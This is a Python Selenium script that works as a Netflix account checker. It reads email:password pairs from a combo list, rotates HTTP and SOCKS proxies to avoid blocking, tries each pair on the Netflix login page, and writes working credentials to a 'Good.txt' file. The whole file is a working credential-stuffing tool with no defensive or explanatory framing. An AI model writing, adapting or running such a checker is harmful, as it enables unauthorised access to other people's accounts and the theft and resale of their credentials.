from selenium import webdriver
from selenium.webdriver.common.by import By
from chromedriver_autoinstaller import install as chromedriver_install
import time

# Function to read proxies from a file and return them as a list
def read_proxies(file_name):
    proxies = []
    with open(file_name, "r") as filestream:
        for line in filestream:
            proxies.append(line.strip())
    return proxies

# Function to cycle through proxies in a circular manner using a generator
def cycle_proxies(proxies):
    index = 0
    while True:
        yield proxies[index]
        index = (index + 1) % len(proxies)

# Function to check the Netflix account using the provided email, password, and proxy
def check_account(email, password, proxy=None):
    try:
        options = webdriver.ChromeOptions()
        if proxy:
            if proxy.startswith("http://"):
                options.add_argument(f"--proxy-server={proxy}")
            elif proxy.startswith("socks4://") or proxy.startswith("socks5://"):
                options.add_argument(f"--proxy-server={proxy}")
                options.add_argument("--proxy-type=socks5" if proxy.startswith("socks5://") else "--proxy-type=socks4")
        driver = webdriver.Chrome(options=options)
        
        driver.get('https://www.netflix.com/login')
        time.sleep(2)

        # Find the email and password input fields and the login button on the login page
        email_input = driver.find_element(By.XPATH, '//*[@id="id_userLoginId"]')
        password_input = driver.find_element(By.XPATH, '//*[@id="id_password"]')
        login_button = driver.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')

        # Enter the email and password and click the login button
        email_input.send_keys(email)
        password_input.send_keys(password)
        login_button.click()

        time.sleep(4)

        # Check if the current URL after login is the browse URL, which indicates a successful login
        if driver.current_url == 'https://www.netflix.com/browse':
            print(f"Account: {email}:{password} is Valid")
            with open("Good.txt", "a") as good_file:
                good_file.write(f"{email}:{password}\n")
        else:
            # If login fails, find the error message element and print the error
            error_message_element = driver.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]')
            error_message = error_message_element.text.strip()
            if "Sorry, we can't find an account with this email address." in error_message:
                print(f"Account: {email}:{password} - Email not found")
            elif "Incorrect password" in error_message:
                print(f"Account: {email}:{password} - Incorrect password")
            else:
                print(f"Account: {email}:{password} - Unknown error")
                
            with open("Bad.txt", "a") as bad_file:
                bad_file.write(f"{email}:{password} - {error_message}\n")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        driver.quit()

def main():
    chromedriver_install()  # Install or update chromedriver
    proxies_file = "proxies.txt"
    proxies = read_proxies(proxies_file)
    proxy_generator = cycle_proxies(proxies)

    with open("combo.txt", "r") as filestream:
        for line in filestream:
            email, password = line.strip().split(":")
            proxy = next(proxy_generator)
            print(f"Using Proxy: {proxy}")
            check_account(email, password, proxy)

if __name__ == "__main__":
    main()
